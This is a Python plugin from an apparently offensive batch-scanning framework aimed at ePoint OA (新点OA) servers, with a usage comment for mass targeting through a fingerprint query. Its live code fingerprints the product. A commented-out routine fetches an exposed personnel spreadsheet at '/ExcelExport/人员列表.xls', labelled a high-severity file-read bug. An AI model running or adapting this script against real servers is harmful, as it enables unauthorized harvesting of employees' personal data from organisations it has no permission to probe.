# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:48
import re

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *


# python3 batch.py -m exploit.scripts.OA.ePoint.sensitive -fs "app=\"新点OA\"" -cs


class Script(BaseScript):
    name = 'ePoint'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/ExcelExport/人员列表.xls']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'type="text/javascript" SourceControl="EpointCommon" ></script>' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

                    # re_match_content = re.search(r'\'(.*)\'', text).group(1)
                    # if re_match_content.startswith('..'):
                    #     re_match_content = re_match_content.split('..')[1]
                    # url2 = f'http://{self.target}{re_match_content}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{re_match_content}'
                    # text2 = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                    # if 'EpointCommon' in text2:
                    #     self.flag = True
                    #     self.twice_addr = url2

    #
    # async def exec(self):
    #     async with aiohttp.ClientSession() as session:
    #         for exec_path in self.exec_path_list:
    #             url = f'{self.twice_addr}{exec_path}'
    #             text2 = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
    #             if text2 is not None:
    #                 gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
    #                 return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(Script('aaa').attack())
